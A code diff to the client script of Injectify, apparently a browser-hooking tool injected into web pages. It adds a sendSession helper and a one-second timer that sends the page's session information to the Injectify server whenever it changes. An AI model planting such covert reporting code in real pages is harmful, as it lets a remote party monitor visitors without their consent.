@@ -295,6 +295,15 @@ window['injectify'] = /** @class */ (function () {
         enumerable: true,
         configurable: true
     });
+    /**
+     * Sends the session info to the server
+    */
+    Injectify.sendSession = function () {
+        var sessionInfo = injectify.sessionInfo;
+        if (this.debug)
+            console.warn('🕵🏼 Delivered session info to server', sessionInfo);
+        this.send('i', sessionInfo);
+    };
     Object.defineProperty(Injectify, "debug", {
         /**
          * Returns whether injectify is in debug mode or not
@@ -345,7 +354,10 @@ var injectify = window['injectify'];
 if (!window['inJl1'])
     window['inJl1'] = {
         listeners: {
-            visibility: false
+            visibility: false,
+            timed: {
+                active: false
+            }
         }
     };
 var global = window['inJl1'];
@@ -358,13 +370,12 @@ injectify.connectTime = +new Date;
  * Debug helpers
  */
 if (injectify.debug) {
-    console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info);
+    console.warn('⚡️ Injectify core.ts loaded! => https://github.com/samdenty99/injectify', injectify.info);
 }
 /**
  * Send session info to the Injectify server
  */
-injectify.send('i', injectify.sessionInfo);
-console.log(injectify.sessionInfo);
+injectify.sendSession();
 /**
  * Replace the basic websocket handler with a feature-rich one
  */
@@ -439,7 +450,7 @@ injectify.listener(function (data, topic) {
         */
         global.listeners.visibility = true;
         var listener = void 0;
-        var focusChange = function () { return injectify.send('i', injectify.sessionInfo); };
+        var focusChange = function () { return injectify.sendSession(); };
         /**
          * Get the correct hidden listener
          */
@@ -463,6 +474,29 @@ injectify.listener(function (data, topic) {
          */
         if (listener)
             document.addEventListener(listener, focusChange);
+    }
+})();
+/**
+ * Session info logger
+ */
+(function () {
+    if (global.listeners.timed.active) {
+        return;
+    }
+    else {
+        global.listeners.timed.active = true;
+        (function sessionInfo() {
+            var currentState = JSON.stringify(injectify.sessionInfo);
+            if (currentState !== global.listeners.timed.prevState) {
+                /**
+                 * If the previous state was defined
+                 */
+                if (global.listeners.timed.prevState)
+                    injectify.sendSession();
+                global.listeners.timed.prevState = currentState;
+            }
+            setTimeout(sessionInfo, 1000);
+        })();
     }
 })();
 /**
